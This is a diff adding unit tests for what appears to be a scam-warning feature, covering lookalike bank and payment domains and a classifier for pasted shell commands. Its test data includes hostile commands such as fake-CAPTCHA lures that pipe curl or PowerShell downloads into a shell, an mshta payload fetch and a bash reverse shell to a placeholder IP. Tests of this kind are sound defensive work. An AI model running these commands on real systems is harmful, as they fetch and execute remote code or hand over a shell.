@@ -560,6 +560,54 @@ class ClearOnExitCrashTests(TmpDirCase):
         bb.unmark_clear_on_exit_pending()  # already gone: no error
 
 
+class ScamWarningTests(unittest.TestCase):
+    def test_lookalike_bank_and_payment_addresses_are_caught(self):
+        for host, name in (("sbi-kyc-update.in", "SBI"), ("onlinesbi.co", "SBI"), ("onlinesbl.com", "SBI"),
+                           ("sbirewardz.com", "SBI"), ("sb1-yono.xyz", "SBI"), ("hdfcbank.co", "HDFC"),
+                           ("hdfcnetbanking.in", "HDFC"), ("hdfcbamk.com", "HDFC"), ("icic1bank.com", "ICICI"),
+                           ("axisbnak.com", "Axis"), ("paytm-kyc.in", "Paytm"), ("phonepay-support.com", "PhonePe"),
+                           ("irctc-tatkal.in", "IRCTC"), ("aadhar-update.com", "Aadhaar"),
+                           ("incometax-refund.in", "Income Tax"), ("flipkrat.com", "Flipkart"),
+                           ("www.hdfcbank.com.secure-login.xyz", "HDFC"), ("onlinesbi.sbi.verify.top", "SBI"),
+                           ("hdfc-login.web.app", "HDFC"), ("аxisbank.com".encode("idna").decode(), "Axis")):
+            match = bb.lookalike_site(host)
+            self.assertIsNotNone(match, host)
+            self.assertEqual(match["kind"], "brand", host)
+            self.assertIn(name, match["name"], host)
+        self.assertEqual(bb.lookalike_site("hdfcbank.co")["official"], "hdfcbank.com")
+        mixed = bb.lookalike_site("раураl.com".encode("idna").decode())
+        self.assertEqual(mixed, {"kind": "mixed", "shown": "раураl.com"})
+
+    def test_real_sites_are_left_alone(self):
+        for host in ("sbi.co.in", "retail.onlinesbi.sbi", "sbi.bank.in", "yonobusiness.sbi", "sbicard.com",
+                     "netbanking.hdfcbank.com", "hdfc.bank.in", "infinity.icicibank.com", "kotak811.com",
+                     "pnbhousing.com", "pay.google.com", "www.irctc.co.in", "myaadhaar.uidai.gov.in",
+                     "eportal.incometax.gov.in", "unifiedportal-mem.epfindia.gov.in", "www.flipkart.com",
+                     "google.com", "amazon.in", "en.wikipedia.org", "kodak.com", "phones.com", "bankbazaar.com",
+                     "aadharhousing.com", "cleartax.in", "zerodha.com", "india.delta.exchange", "results.cbse.nic.in",
+                     "localhost", "192.168.1.1", "printer.local", "भारत.भारत".encode("idna").decode(),
+                     "пример.рф".encode("idna").decode(), "", None):
+            self.assertIsNone(bb.lookalike_site(host), host)
+
+    def test_copied_command_risk(self):
+        risk = bb.copied_command_risk
+        for text in ("curl -s https://x.top/v | bash # I am not a robot - reCAPTCHA Verification ID: 2165",
+                     'powershell -w h -c "iex(iwr https://x.top/a)" # I am human - Cloudflare Ray ID: 8f2a',
+                     'bash -c "$(curl -fsSL http://1.2.3.4/s)"' + " " * 60 + "Verification code 8812",
+                     "mshta https://x.top/captcha.hta   ::  Press Enter to confirm you are human"):
+            self.assertEqual(risk(text), "scam", text)
+        for text in ("curl -fsSL https://get.docker.com | sh",
+                     '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
+                     "wget -qO- https://x/install.sh | sudo bash", "wget https://x/a.bin && chmod +x a.bin && ./a.bin",
+                     "echo aGVsbG8= | base64 -d | sh", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+                     "irm https://get.scoop.sh | iex", "bash <(curl -s https://x/s)"):
+            self.assertEqual(risk(text), "command", text)
+        for text in ("sudo apt install vlc", "git clone https://github.com/a/b.git", "https://example.com/page",
+                     "Hello world # not a robot", "curl https://example.com -o file.html", "ls -la | grep foo",
+                     "cmd.exe is the Windows command prompt", "", None):
+            self.assertIsNone(risk(text), text)
+
+
 class SiteSettingsTests(TmpDirCase):
     def test_set_get_and_cleanup(self):
         s = {}
